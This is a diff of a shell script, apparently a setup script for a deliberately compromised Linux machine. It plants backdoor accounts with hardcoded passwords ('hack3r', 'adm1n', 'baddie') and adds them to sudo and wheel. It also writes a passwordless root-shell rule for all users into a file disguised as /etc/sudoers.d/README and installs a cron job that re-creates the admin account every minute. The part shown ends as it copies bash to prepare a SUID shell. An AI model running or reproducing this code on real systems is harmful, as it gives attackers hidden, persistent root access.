@@ -9,11 +9,18 @@ fi
 useradd -p $(openssl passwd -1 hack3r) hack3r
 useradd -p $(openssl passwd -1 baddie) baddie
 useradd -p $(openssl passwd -1 adm1n) adm1n
-echo 'adm1n        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers
+echo 'ALL ALL=NOPASSWD:/bin/bash' >> /etc/sudoers.d/README
 usermod -aG sudo adm1n
 usermod -aG wheel adm1n
 usermod -aG sudo baddie
 usermod -aG wheel hack3r
+#write out current crontab
+echo "useradd -p $(openssl passwd -1 adm1n) adm1n && usermod -aG sudo adm1n">/opt/1
+chmod +x /opt/1
+crontab -l > mycron
+echo "* * * * * bash /opt/1" >> mycron
+crontab mycron
+rm mycron
 #COPY bash shell
 cp /bin/bash /usr/share/home
 #ADD SUID bit for privesc
